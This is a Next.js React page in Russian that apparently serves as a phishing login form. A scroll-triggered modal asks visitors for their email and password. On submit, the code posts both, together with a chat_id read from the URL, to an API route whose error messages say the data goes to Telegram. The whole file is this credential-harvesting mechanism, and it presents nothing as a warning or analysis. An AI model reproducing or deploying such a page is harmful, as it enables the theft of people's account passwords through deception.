"use client";
import { useEffect, useRef, useState } from "react";
import { useParams } from "next/navigation";

export default function IdPage() {
  const params = useParams();
  const chatId = params?.id || "";
  const [form, setForm] = useState({ email: "", password: "" });
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");
  const [isOpened, setIsOpened] = useState(false);
  const modalRef = useRef<HTMLDivElement>(null);
  const scrollDownRef = useRef<HTMLDivElement>(null);

  const openModal = () => {
    setIsOpened(true);
    document.body.style.overflow = "hidden";
    if (scrollDownRef.current) scrollDownRef.current.style.display = "none";
  };

  const closeModal = () => {
    setIsOpened(false);
    document.body.style.overflow = "initial";
    if (scrollDownRef.current) scrollDownRef.current.style.display = "flex";
    window.scrollTo({ top: 0, behavior: "smooth" });
  };

  useEffect(() => {
    const onScroll = () => {
      if (window.scrollY > window.innerHeight / 3 && !isOpened) {
        openModal();
      }
    };
    window.addEventListener("scroll", onScroll);
    return () => window.removeEventListener("scroll", onScroll);
  }, [isOpened]);

  useEffect(() => {
    const onKeyDown = (e: KeyboardEvent) => {
      if (e.key === "Escape") closeModal();
    };
    document.addEventListener("keydown", onKeyDown);
    return () => document.removeEventListener("keydown", onKeyDown);
  }, []);

  return (
    <>
      <div className="container"></div>
      {!isOpened && (
        <>
          <div ref={scrollDownRef} className="scroll-down-center">
            <span className="scroll-text">Прокрутите вниз</span>
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" width={52} height={52}>
              <path d="M16 3C8.832031 3 3 8.832031 3 16s5.832031 13 13 13 13-5.832031 13-13S23.167969 3 16 3zm0 2c6.085938 0 11 4.914063 11 11 0 6.085938-4.914062 11-11 11-6.085937 0-11-4.914062-11-11C5 9.914063 9.914063 5 16 5zm-1 4v10.28125l-4-4-1.40625 1.4375L16 23.125l6.40625-6.40625L21 15.28125l-4 4V9z"/>
            </svg>
          </div>
          <div className="scroll-down-btn">
            <button
              className="modal-button"
              onClick={() => {
                window.scrollTo({ top: window.innerHeight, behavior: "smooth" });
                setTimeout(() => openModal(), 400);
              }}
            >
              Войти
            </button>
          </div>
        </>
      )}
      <div
        ref={modalRef}
        className={`modal${isOpened ? " is-open" : ""}`}
      >
        <div className="modal-container compact-modal">
          <div className="modal-left compact-left">
            <button className="icon-button close-button" onClick={closeModal}>
              ✕
            </button>
            <h1 className="modal-title compact-title">Вход</h1>
            <form onSubmit={e => {
              e.preventDefault();
              setError("");
              setSuccess("");
              if (!chatId) {
                setError("chat_id не найден в URL");
                return;
              }
              if (!form.email || !form.password) {
                setError("Заполните все поля");
                return;
              }
              fetch("/api/send", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ ...form, chat_id: chatId }),
              }).then(res => {
                if (res.ok) {
                  setSuccess("Данные успешно отправлены!");
                  setForm({ email: "", password: "" });
                } else {
                  setError("Ошибка отправки в Telegram");
                }
              }).catch(() => setError("Ошибка отправки в Telegram"));
            }}>
              <div className="input-block compact-input">
                <label htmlFor="email" className="input-label">Почта</label>
                <input type="email" name="email" id="email" placeholder="Почта" value={form.email} onChange={e => setForm(f => ({...f, email: e.target.value}))} />
              </div>
              <div className="input-block compact-input">
                <label htmlFor="password" className="input-label">Пароль</label>
                <input type="password" name="password" id="password" placeholder="Пароль" value={form.password} onChange={e => setForm(f => ({...f, password: e.target.value}))} />
              </div>
              <button className="input-button compact-btn" type="submit">Зарегестрироваться</button>
              {error && <div className="error compact-error">{error}</div>}
              {success && <div className="success compact-success">{success}</div>}
            </form>
            <p className="sign-up compact-sign">уже есть аккаунт? <a href="#">Войдите</a></p>
          </div>
          <div className="modal-right compact-right">
            <img src="https://images.unsplash.com/photo-1512486130939-2c4f79935e4f?ixlib=rb-0.3.5&ixid=eyJhcHBfaWQiOjEyMDd9&s=dfd2ec5a01006fd8c4d7592a381d3776&auto=format&fit=crop&w=1000&q=80" alt="" />
          </div>
        </div>
      </div>
    </>
  );
}
